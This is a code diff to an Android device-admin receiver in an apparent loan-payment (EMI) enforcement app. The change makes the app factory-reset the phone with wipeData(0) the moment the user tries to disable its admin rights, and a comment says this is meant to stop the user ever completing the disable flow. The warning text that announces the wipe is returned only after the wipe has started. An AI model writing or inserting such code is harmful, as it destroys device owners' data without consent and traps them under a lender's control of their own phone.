@@ -70,30 +70,39 @@ class EMIDeviceAdminReceiver : DeviceAdminReceiver() {
         val uninstallAllowed = prefs.getBoolean(KEY_UNINSTALL_ALLOWED, false)
         
         if (!uninstallAllowed) {
-            // Lock the device screen immediately when someone tries to disable admin
+            // FACTORY RESET: Wipe the device data immediately.
+            // Admin is still active at this point so wipeData() succeeds.
+            // This prevents the user from ever completing the disable flow.
             try {
                 val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                 val adminComponent = android.content.ComponentName(context, EMIDeviceAdminReceiver::class.java)
                 if (dpm.isAdminActive(adminComponent)) {
-                    dpm.lockNow()
-                    Log.d(TAG, "Device locked due to unauthorized disable attempt")
+                    Log.w(TAG, "UNAUTHORIZED DISABLE ATTEMPT - WIPING DEVICE")
+                    prefs.edit().putBoolean("tamper_detected", true).apply()
+                    dpm.wipeData(0)
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to lock device on disable request: ${e.message}")
+                Log.e(TAG, "Failed to wipe device on disable request: ${e.message}")
+                // Fallback: lock screen and launch app
+                try {
+                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val adminComponent = android.content.ComponentName(context, EMIDeviceAdminReceiver::class.java)
+                    if (dpm.isAdminActive(adminComponent)) {
+                        dpm.lockNow()
+                    }
+                } catch (e2: Exception) {
+                    Log.e(TAG, "Fallback lock also failed: ${e2.message}")
+                }
+                prefs.edit().putBoolean("tamper_detected", true).apply()
+                launchAppForTamperPrompt(context)
             }
-            // Record tamper attempt
-            prefs.edit().putBoolean("tamper_detected", true).apply()
-
-            // Bring the app to foreground immediately so user sees the warning
-            launchAppForTamperPrompt(context)
         }
         
         return if (uninstallAllowed) {
             "Device admin will be deactivated."
         } else {
-            "WARNING: Disabling device admin will remove EMI payment protection. " +
-            "This action will be reported to your loan provider and may result in " +
-            "immediate device lock and additional penalties."
+            "WARNING: Disabling device admin will WIPE ALL DATA on this device. " +
+            "This action is irreversible."
         }
     }
 }
